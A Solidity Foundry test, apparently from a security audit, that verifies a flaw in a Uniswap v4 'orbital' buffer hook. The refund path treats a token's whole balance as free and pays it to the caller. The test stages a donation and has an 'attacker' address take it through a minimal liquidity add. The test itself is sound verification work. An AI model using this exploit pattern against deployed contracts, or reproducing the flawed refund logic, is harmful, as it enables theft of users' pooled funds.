// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {SimpleMintableERC20} from "contracts/test/stubs/SimpleMintableERC20.sol";
import {
    TestBase_UniswapV4StandardExchangeOrbitalBufferHook
} from "contracts/hooks/uniswap/v4/standardExchange/orbital/TestBase_UniswapV4StandardExchangeOrbitalBufferHook.sol";

/**
 * @notice APEX-2026-008 (orbital variant) — adversarial verification.
 *
 *         Unlike the other five buffer-hook families, orbital's refund path makes NO
 *         attempt to buffer the balance back into the SE first, and for a buffered leg it
 *         declares the ENTIRE face balance free:
 *
 *             function _freeTokenBalance(address token) internal view returns (uint256 free) {
 *                 uint256 bal = IERC20(token).balanceOf(address(this));
 *                 if (_seOf(token) != address(0)) {
 *                     if (_seOf(token) == token) return 0;
 *                     return bal;                                   // <-- entire balance
 *                 }
 *                 uint256 book = Repo._layout().reserves[token];
 *                 return bal > book ? bal - book : 0;               // <-- correct form
 *             }
 *
 *         then `_refundFreeOfToken` sends it to `to == msg.sender`.
 *
 *         If that is reachable, a donation (or any resting face balance) leaves with the
 *         next caller. This test measures it rather than assuming it.
 */
contract ApexOrbitalFreeRefund is TestBase_UniswapV4StandardExchangeOrbitalBufferHook {
    address internal attacker = address(0xA77ACC);

    function _addAs(address who, uint256 a0, uint256 a1, uint256 a2) internal {
        token0.mint(who, a0);
        token1.mint(who, a1);
        token2.mint(who, a2);
        vm.startPrank(who);
        IERC20(address(token0)).approve(hook, type(uint256).max);
        IERC20(address(token1)).approve(hook, type(uint256).max);
        IERC20(address(token2)).approve(hook, type(uint256).max);
        orbital.addLiquidity(a0, a1, a2, who, 0, block.timestamp + 1 hours, "");
        vm.stopPrank();
    }

    function test_apex008_orbital_donationFollowsTheCaller() public {
        _seedThreeLeg(1_000 ether);

        address t0 = address(token0);
        uint256 donation = 500 ether;
        token0.mint(hook, donation);

        uint256 hookBefore = IERC20(t0).balanceOf(hook);
        uint256 attBefore  = IERC20(t0).balanceOf(attacker);
        emit log_named_address("se for token0     ", se0);
        emit log_named_uint("donation on hook   ", donation);
        emit log_named_uint("hook face (before) ", hookBefore);

        // attacker performs a minimal-but-valid liquidity add
        uint256 contributed = 1 ether;
        _addAs(attacker, contributed, contributed, contributed);

        uint256 gained = IERC20(t0).balanceOf(attacker) - attBefore;
        emit log_named_uint("hook face (after)  ", IERC20(t0).balanceOf(hook));
        emit log_named_uint("attacker face bal  ", gained);
        emit log_named_uint("attacker contributed (t0)", contributed);

        // Net profit: the attacker was minted exactly `contributed` of t0 and spent it on the
        // add. Anything it holds beyond that is value it did not supply.
        if (gained > contributed) {
            emit log_named_uint("NET PROFIT in t0", gained - contributed);
            emit log_string("CONFIRMED: caller took face balance it did not contribute");
        } else {
            emit log_string("NOT REACHABLE by this route (caller only recovered its own input)");
        }
        assertGt(gained, contributed, "APEX-2026-008 orbital: free face balance paid to caller");
    }
}
